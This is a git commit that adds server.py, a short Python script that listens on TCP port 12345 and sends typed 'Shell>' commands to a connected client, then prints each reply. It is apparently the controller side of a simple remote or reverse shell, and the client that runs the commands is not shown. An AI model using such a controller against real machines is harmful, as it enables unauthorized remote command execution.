759ee880e2dc5f9d814111412357341f5763d432
Alessandro <nonameon@protonmail.ch>
2021-03-22 16:36:52 +0100

    Add files via upload

---
+++ server.py
@@ -0,0 +1,32 @@
+from socket import *
+
+def connect():
+    # TCP connection
+    sock = socket(AF_INET, SOCK_STREAM)
+
+    port = 12345
+    sock.bind(('', port))
+
+    sock.listen(1)
+
+    print("[+] Listening for incoming TCP connection on port ", port)
+
+    conn, addr = sock.accept()
+
+    print("Connection from: ", addr)
+
+    while 1:
+        command = input("Shell> ")
+
+        if "terminate" in command:
+            conn.send("terminate")
+            conn.close()
+        else:
+            # send command to client
+            conn.send(command.encode())
+            # print response
+            print(conn.recv(1024).decode("utf-8") )
+
+def main():
+    connect()
+main()
